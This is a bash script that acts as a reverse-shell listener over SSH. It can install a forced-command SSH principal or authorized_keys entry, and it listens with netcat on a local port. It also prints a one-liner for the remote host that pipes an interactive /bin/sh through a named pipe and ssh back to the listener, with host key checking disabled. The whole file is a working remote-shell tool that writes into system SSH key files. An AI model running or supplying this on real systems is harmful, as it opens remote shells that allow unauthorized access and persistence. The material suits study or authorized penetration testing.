#!/bin/bash

PORT=9998
USER=rshell
SCRIPT_PATH="$(pwd)/$0"
HOSTNAME=$(hostname)

usage() {
  cat <<- '_EOM_'
Usage: $0 [OPTIONS] [-c|-i <principal>]" >&2
  -c              Connect to the remote shell endpoint
  -i <principal>  Install SSH principal <principal>
  DEFAULT         Listen for incomming connections

  Options:
      -u <user>   The user under which to install the principal
                  DEFAULT 'rshell'
      -p <port>   The internal IPC port between connector and listener
                  DEFAULT 9998
      -l          Install the principal under /home/<user>/.ssh/authorized_keys
                  instead of /etc/ssh/additional_authorized_principals
_EOM_
#"
}

while getopts "i:u:p:hcl" o; do
  case "${o}" in
    i)
      INSTALL=1
      PRINCIPAL=${OPTARG}
      ;;
    u)
      USER=${OPTARG}
      ;;
    p)
      PORT=${OPTARG}
      ;;
    l)
      LOCAL=1
      ;;
    c)
      CONNECTION=1
      ;;
    *)
      usage
      exit 1
      ;;
  esac
done


if [ "${CONNECTION}" == "1" ]
then
  # SSH connection
  nc 127.0.0.1 $PORT
  exit
elif [ "${INSTALL}" == "1" ]
then
  # Install the principals
  PID=`echo ${PRINCIPAL} | sha1sum | awk '{print $1}'`
  if [ "${LOCAL}" == "1" ]
  then
    PRINCIPAL_PATH="/home/${USER}/.ssh/authorized_keys"
    touch ${PRINCIPAL_PATH}
    chown $USER:$USER ${PRINCIPAL_PATH}
    chmod 600 ${PRINCIPAL_PATH}
  else
    PRINCIPAL_PATH="/etc/ssh/additional_authorized_principals/$USER"
  fi

  if [ -f ${PRINCIPAL_PATH} ]
  then
    # AWK foo to remove the principal from the file if it already exists
    EXISTING_PRINCIPLES=`cat ${PRINCIPAL_PATH} | awk "/${PID}/ {for (i=0; i<1; i++) {getline}; next} 1"`
  fi
  echo "Installing additional authorized principal $USER => $PRINCIPAL"
  echo -e "# SSHREVERSE_${PID}\nno-agent-forwarding,no-pty,no-port-forwarding,no-user-rc,no-X11-forwarding,command=\"$SCRIPT_PATH -c -p $PORT\" ${PRINCIPAL}\n${EXISTING_PRINCIPLES}" > ${PRINCIPAL_PATH}
  exit
fi

echo "Run the following command on the remote server:"
echo "    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -o \"StrictHostKeyChecking no\" -o \"UserKnownHostsFile /dev/null\" $USER@$HOSTNAME > /tmp/f; rm /tmp/f"
while [ true ]
do 
  echo "Waiting for connection"
  nc -vvn -l 127.0.0.1 $PORT
done
